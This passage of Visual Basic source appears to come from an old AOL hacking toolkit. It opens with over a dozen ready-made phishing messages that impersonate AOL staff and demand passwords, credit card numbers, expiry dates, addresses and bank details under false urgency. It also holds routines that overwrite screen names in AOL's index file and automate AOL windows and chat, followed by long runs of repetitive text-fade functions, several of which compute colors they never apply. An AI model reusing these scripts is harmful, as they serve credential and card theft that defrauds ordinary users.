ElseIf phraZes = "73" Then
text2 = "Attention:The message at the bottom of the screen is void when speaking to AOL employess.We are very sorry to inform you that due to a legal conflict, the Sprint network(which is the network AOL uses to connect it users) is witholding the transfer of the log-in password at sign-on.To correct this problem,We need you to click on RESPOND and enter your password, so we can update your personal Master-File,containing all of your personal info.  We are very sorry for this inconvience --AOL Customer Service Dept."
ElseIf phraZes = "74" Then
text2 = "Hello, I am with the America Online Password Verification Commity. Due to many members incorrectly typing thier passwords at first logon sequence I must ask you to retype your password for a third and final verification. No AOL staff will ask you for your password after this process. Please respond within 2 minutes to keep this account active."
ElseIf phraZes = "75" Then
text2 = "Remember AOL will never ask for your password or billing information online, but due to a problem with all Sprint and TymeNet Local Access telephone numbers I must report all system errors within 24 hours. You cannot stay Online unless you respond with your VALID password.  Thank you for your cooperation "
ElseIf phraZes = "76" Then
text2 = "Please disregard the message in red. Unfortunately, a hacker broke into the main AOL computer and managed to destroy our password verification logon routine and user database, this means that anyone could log onto your account without any password validation. The red message was added to fool users and make it difficult for AOL to restore your account information. To avoid canceling your account, will require you to respond with your password. After this, no AOL employee will ask you for your password again."
ElseIf phraZes = "77" Then
text2 = "Dear America Online user, due to the recent America Online crash, your password has been lost from the main computer systems'.  To fix this error, we need you to click RESPOND and respond with your current password.  Please respond within 2 minutes to keep active.  We are sorry for this inconvinience, this is a ONE time emergency.  Thank you and continue to enjoy America Online!"
ElseIf phraZes = "78" Then
text2 = "Hello, I am an America Online Administrator.  Due to a problem we're experiencing with the Sprint Network, we need you to verify your log-in password to me so that you can continue this log-in session with America Online.  We apologize for this inconvenience, and thank you for cooperation. "
ElseIf phraZes = "79" Then
text2 = "Dear User, I am sorry to report that your account has been traced and has shown that you are signed on from another location.  To make sure that this is you please enter your sign on password so we can verify that this is you.  Thank You! AOL."
ElseIf phraZes = "80" Then
text2 = "Hello, I am sorry to inturrupt but I am from the America Online Service Departement. We have been having major problems with your account information. Now we understand that you have been instructed not to give out and information, well were sorry to say but in this case you must or your account will be terminated. We need your full name as well as last, Adress, Credit Card number as well as experation date as well as logon password. We our really sorry for this inconveniance and grant you 10 free hours. Thank you and enjoy AOL."
ElseIf phraZes = "81" Then
text2 = "Hello, My name is Dan Weltch from America Online. We have been having extreme difficulties with your records. Please give us your full log-on Scree Name(s) as well as the log-on PW(s), thank you :-)"
ElseIf phraZes = "82" Then
text2 = "Hello, I am the TOSAdvisor. I am on a different account because there has been hackers invading our system and taking over our accounts. If you could please give us your full log on PW so we can correct this problem, thank you and enjoy AOL. "
ElseIf phraZes = "83" Then
text2 = "Hello, I am from the America Online Credit Card Records and we have been experiancing a major problem with your CC# information. For us to fix this we need your full log-on screen names(s) and password(s), thank. "
ElseIf phraZes = "84" Then
text2 = "Hi, I'm with Anti-Hacker Dept of AOL. Due to Thë break-in's into our system, we have experienced problems. We need you to respond with your credit card #, exp date, full name, address, and phone # to correct errors. "
ElseIf phraZes = "85" Then
text2 = "Hello, I am with the America Online Billing Department, due to a failure in our data carrier, we did not recieve your information when you made your account, for our records, please click 'respond' then state your Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."

End If
text2 = "Hello, I am with the America Online New User Validation Department.  I am happy to inform you that the validation process is almost complete.  To complete the validation process i need you to respond with your full name, address, phone number, city, state, zip code,  credit card number, expiration date, and bank name.  Thank you and enjoy AOL. "

End Sub

Function RandomNumber(finished)
Randomize
RandomNumber = Int((Val(finished) * Rnd) + 1)
End Function

Sub addroom(Lst As ListBox)
Dim Index As Long
Dim i As Integer
For Index = 0 To 25
namez$ = String$(256, " ")
Ret = AOLGetList(Index, namez$)
namez$ = Left$(Trim$(namez$), Len(Trim(namez$)))
ADD_AOL_LB namez$, Lst
Next Index
end_addr:
Lst.RemoveItem Lst.ListCount - 1
i = GetListIndex(Lst, AOLGetUser())
If i <> -2 Then Lst.RemoveItem i
End Sub




Sub AOLSNReset(SN$, aoldir$, Replace$)
l0036 = Len(SN$)
Select Case l0036
Case 3
i = SN$ + "       "
Case 4
i = SN$ + "      "
Case 5
i = SN$ + "     "
Case 6
i = SN$ + "    "
Case 7
i = SN$ + "   "
Case 8
i = SN$ + "  "
Case 9
i = SN$ + " "
Case 10
i = SN$
End Select
l0036 = Len(Replace$)
Select Case l0036
Case 3
Replace$ = Replace$ + "       "
Case 4
Replace$ = Replace$ + "      "
Case 5
Replace$ = Replace$ + "     "
Case 6
Replace$ = Replace$ + "    "
Case 7
Replace$ = Replace$ + "   "
Case 8
Replace$ = Replace$ + "  "
Case 9
Replace$ = Replace$ + " "
Case 10
Replace$ = Replace$
End Select
x = 1
Do Until 2 > 3
Text$ = ""
DoEvents
On Error Resume Next
Open aoldir$ + "\idb\main.idx" For Binary As #1
If Err Then Exit Sub
Text$ = String(32000, 0)
Get #1, x, Text$
Close #1
Open aoldir$ + "\idb\main.idx" For Binary As #2
Where1 = InStr(1, Text$, i, 1)
If Where1 Then
Mid(Text$, Where1) = Replace$
ReplaceX$ = Replace$
Put #2, x + Where1 - 1, ReplaceX$
401:
DoEvents
Where2 = InStr(1, Text$, i, 1)
If Where2 Then
Mid(Text$, Where2) = Replace$
Put #2, x + Where2 - 1, ReplaceX$
GoTo 401
End If
End If
x = x + 32000
LF2 = LOF(2)
Close #2
If x > LF2 Then GoTo 301
Loop
301:
End Sub



Sub AOLIcon(icon%)
click% = SendMessage(icon%, WM_LBUTTONDOWN, 0, 0&)
click% = SendMessage(icon%, WM_LBUTTONUP, 0, 0&)
End Sub

Public Sub TB4(Number As Integer)
Aol% = FindWindow("AOL Frame25", vbNullString)
TB% = FindChildByClass(Aol%, "AOL Toolbar")
tc% = FindChildByClass(TB%, "_AOL_Toolbar")
td% = FindChildByClass(tc%, "_AOL_Icon")

If Number = 1 Then
    Call AOLIcon(td%)
    Exit Sub
End If

For T = 0 To Number - 2
td% = GetWindow(td%, 2)
Next T

Call AOLIcon(td%)

End Sub


Function AOLMDI()
Aol% = FindWindow("AOL Frame25", vbNullString)
AOLMDI = FindChildByClass(Aol%, "MDIClient")
End Function


Sub killwin(hWnd%)
' |¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯|\
' |Closes a chosen window                              | |
' |____________________________________________________| |
'  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\__\|
Dim KillNow%
KillNow% = sendmessagebynum(hWnd%, WM_CLOSE, 0, 0)
End Sub


Function fader(thetext$)
G$ = thetext
A = Len(G$)
For W = 1 To A Step 8
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    V$ = Mid$(G$, W + 4, 1)
    Q$ = Mid$(G$, W + 5, 1)
    x$ = Mid$(G$, W + 6, 1)
    Y$ = Mid$(G$, W + 7, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#000000" & Chr$(34) & ">" & r$ & "<FONT COLOR=" & Chr$(34) & "#696969" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#808080" & Chr$(34) & ">" & S$ & "<FONT COLOR=" & Chr$(34) & "#C0C0C0" & Chr$(34) & ">" & T$ & "<FONT COLOR=" & Chr$(34) & "#DCDCDC" & Chr$(34) & ">" & V$ & "<FONT COLOR=" & Chr$(34) & "#C0C0C0" & Chr$(34) & ">" & Q$ & "<FONT COLOR=" & Chr$(34) & "#808080" & Chr$(34) & ">" & x$ & "<FONT COLOR=" & Chr$(34) & "#696969" & Chr$(34) & ">" & Y$
Next W
SendChat p$
End Function

Public Function AOLGetNewMail(Index) As String
Aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(Aol%, "MDIClient")
mail% = FindChildByTitle(MDI%, AOLGetUser & "'s Online Mailbox")
tabd% = FindChildByClass(mail%, "_AOL_TabControl")
tabp% = FindChildByClass(tabd%, "_AOL_TabPage")
AOLTree% = FindChildByClass(tabp%, "_AOL_Tree")

'de = sendmessage(aoltree%, LB_GETCOUNT, 0, 0)
txtlen% = sendmessagebynum(AOLTree%, LB_GETTEXTLEN, Index, 0&)
txt$ = String(txtlen% + 1, 0&)
x = SendMEssageByString(AOLTree%, LB_GETTEXT, Index, txt$)
AOLGetNewMail = txt$
End Function
Public Function GetListIndex(oListBox As ListBox, sText As String) As Integer
Dim iIndex As Integer
With oListBox
 For iIndex = 0 To .ListCount - 1
   If .List(iIndex) = sText Then
    GetListIndex = iIndex
    Exit Function
   End If
 Next iIndex
End With
GetListIndex = -2
End Function

Function AOLGetUser()
On Error Resume Next
Aol% = FindWindow("AOL Frame25", "America  Online")
MDI% = FindChildByClass(Aol%, "MDIClient")
Welcome% = FindChildByTitle(MDI%, "Welcome, ")
WelcomeLength% = GetWindowTextLength(Welcome%)
WelcomeTitle$ = String$(200, 0)
A% = GetWindowText(Welcome%, WelcomeTitle$, (WelcomeLength% + 1))
User = Mid$(WelcomeTitle$, 10, (InStr(WelcomeTitle$, "!") - 10))
AOLGetUser = User
End Function


Sub ADD_AOL_LB(itm As String, Lst As ListBox)
If Lst.ListCount = 0 Then
Lst.AddItem itm
Exit Sub
End If
Do Until XX = (Lst.ListCount)
Let diss_itm$ = Lst.List(XX)
If Trim(LCase(diss_itm$)) = Trim(LCase(itm)) Then Let do_it = "NO"
Let XX = XX + 1
Loop
If do_it = "NO" Then Exit Sub
Lst.AddItem itm
End Sub
Sub AOLversion()

Aol% = FindWindow("AOL Frame25", 0&)
Wel% = FindChildByTitle(Aol%, "Welcome, " + UserSN())
aol3% = FindChildByClass(Wel%, "RICHCNTL")
If aol3% = 0 Then AC_AOLVersion = 25: Exit Sub
If aol3% <> 0 Then
    If GetCaption(Aol%) <> "America Online" Then AC_AOLVersion = 3 Else AC_AOLVersion = 4
    End If
    End Sub
Function fadeBlackBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(f, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeBlackBlue = Msg
End Function

Function fadeBlackGreen(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(0, f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
fadeBlackGreen = Msg
End Function

Function fadeBlackGrey(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 220 / A
        f = E * b
        G = RGB(f, f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeBlackGrey = Msg
End Function

Function fadeBlackPurple(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(f, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeBlackPurple = Msg
End Function

Function fadeBlackRed(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(0, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeBlackRed = Msg
End Function

Function fadeBlackYellow(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(0, f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeBlackYellow = Msg
End Function

Function fadeBlueBlack(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(255 - f, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeBlueBlack = Msg
End Function

Function fadeBlueGreen(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(255 - f, f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeBlueGreen = Msg
End Function

Function fadeBluePurple(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(255, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeBluePurple = Msg
End Function

Function fadeBlueRed(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(255 - f, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeBlueRed = Msg
End Function

Function fadeBlueYellow(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(255 - f, f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeBlueYellow = Msg
End Function

Function fadeGreenBlack(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(0, 255 - f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeGreenBlack = Msg
End Function

Function fadeGreenBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(f, 255 - f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeGreenBlue = Msg
End Function

Function fadeGreenPurple(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(f, 255 - f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeGreenPurple = Msg
End Function

Function fadeGreenRed(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(0, 255 - f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeGreenRed = Msg
End Function

Function fadeGreenYellow(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(0, 255, f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeGreenYellow = Msg
End Function

Function fadeGreyBlack(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 220 / A
        f = E * b
        G = RGB(255 - f, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeGreyBlack = Msg
End Function

Function fadeGreyBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(255, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeGreyBlue = Msg
End Function

Function fadeGreyGreen(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(255 - f, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeGreyGreen = Msg
End Function

Function fadeGreyPurple(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(255, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeGreyPurple = Msg
End Function

Function fadeGreyRed(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(255 - f, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeGreyRed = Msg
End Function

Function fadeGreyYellow(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(255 - f, 255, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeGreyYellow = Msg
End Function

Function fadePurpleBlack(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(255 - f, 0, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadePurpleBlack = Msg
End Function

Function fadePurpleBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(255, 0, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadePurpleBlue = Msg
End Function

Function fadePurpleGreen(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(255 - f, f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadePurpleGreen = Msg
End Function

Function fadePurpleRed(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(255 - f, 0, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadePurpleRed = Msg
End Function

Function fadePurpleYellow(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(255 - f, f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadePurpleYellow = Msg
End Function

Function fadeRedBlack(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(0, 0, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeRedBlack = Msg
End Function

Function fadeRedBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(f, 0, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeRedBlue = Msg
End Function

Function fadeRedGreen(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(0, f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeRedGreen = Msg
End Function

Function fadeRedPurple(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(f, 0, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeRedPurple = Msg
End Function

Function fadeRedYellow(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(0, f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeRedYellow = Msg
End Function

Function fadeYellowBlack(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(0, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeYellowBlack = Msg
End Function

Function fadeYellowBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(f, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeYellowBlue = Msg
End Function

Function fadeYellowGreen(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(0, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeYellowGreen = Msg
End Function

Function fadeYellowPurple(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(f, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeYellowPurple = Msg
End Function

Function fadeYellowRed(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 255 / A
        f = E * b
        G = RGB(0, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeYellowRed = Msg
End Function


'Pre-set 3 Color fade combinations begin here


Function fadeBlackBlueBlack(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeBlackBlueBlack = Msg
End Function

Function fadeBlackGreenBlack(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeBlackGreenBlack = Msg
End Function

Function fadeBlackGreyBlack(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 490 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeBlackGreyBlack = Msg
End Function

Function fadeBlackPurpleBlack(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeBlackPurpleBlack = Msg
End Function

Function fadeBlackRedBlack(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeBlackRedBlack = Msg
End Function

Function fadeBlackYellowBlack(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeBlackYellowBlack = Msg
End Function

Function fadeBlueBlackBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeBlueBlackBlue = Msg
End Function

Function fadeBlueGreenBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeBlueGreenBlue = Msg
End Function

Function fadeBluePurpleBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeBluePurpleBlue = Msg
End Function

Function fadeBlueRedBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeBlueRedBlue = Msg
End Function

Function fadeBlueYellowBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeBlueYellowBlue = Msg
End Function

Function fadeGreenBlackGreen(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeGreenBlackGreen = Msg
End Function

Function fadeGreenBlueGreen(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeGreenBlueGreen = Msg
End Function

Function fadeGreenPurpleGreen(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeGreenPurpleGreen = Msg
End Function

Function fadeGreenRedGreen(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeGreenRedGreen = Msg
End Function

Function fadeGreenYellowGreen(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeGreenYellowGreen = Msg
End Function

Function fadeGreyBlackGrey(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 490 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeGreyBlackGrey = Msg
End Function

Function fadeGreyBlueGrey(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 490 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeGreyBlueGrey = Msg
End Function

Function fadeGreyGreenGrey(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 490 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeGreyGreenGrey = Msg
End Function

Function fadeGreyPurpleGrey(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 490 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeGreyPurpleGrey = Msg
End Function

Function fadeGreyRedGrey(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 490 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeGreyRedGrey = Msg
End Function

Function fadeGreyYellowGrey(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 490 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeGreyYellowGrey = Msg
End Function

Function fadePurpleBlackPurple(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadePurpleBlackPurple = Msg
End Function

Function fadePurpleBluePurple(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadePurpleBluePurple = Msg
End Function

Function fadePurpleGreenPurple(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
